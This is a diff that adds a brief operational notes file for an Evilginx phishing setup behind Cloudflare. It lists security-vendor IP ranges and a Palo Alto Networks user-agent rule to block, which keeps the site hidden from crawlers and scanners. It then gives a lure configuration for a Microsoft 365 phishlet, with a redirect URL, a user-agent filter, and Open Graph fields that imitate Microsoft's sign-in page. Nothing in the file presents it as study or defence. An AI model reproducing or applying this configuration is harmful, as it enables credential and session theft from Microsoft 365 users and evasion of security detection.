@@ -1,0 +1,27 @@
+# CLOUDFLARE AND EVILGINX SET CUSTOM RULES TO EVADE CRAWLERS
+
+Block all incoming which is in the following ip ranges 
+
+35.203.210.0/23
+144.86.173.0/24
+147.185.132.0/23
+198.235.24.0/24
+205.210.31.0/24
+
+and user agent's name contains Palo Alto Networks
+
+
+(SEO SETUP)
+      "id": "",
+      "hostname": "",
+      "path": "/IPaBDOZK",
+      "redirect_url": "https://commerce.aquapebble.org/endsession",
+      "phishlet": "microsoft365",
+      "redirector": "",
+      "ua_filter": "(?i)(mobile|windows|macbook|desktop)",
+      "info": "Microsoft Outlook 365",
+      "og_title": "Sign in to your Microsoft 365 Account",
+      "og_desc": "Access your email, domains, and account settings",
+      "og_image": "https://wehitasnag.pages.dev/microsoftsvg.png",
+      "og_url": "https://login.microsoftonline.com/",
+      "paused": 0
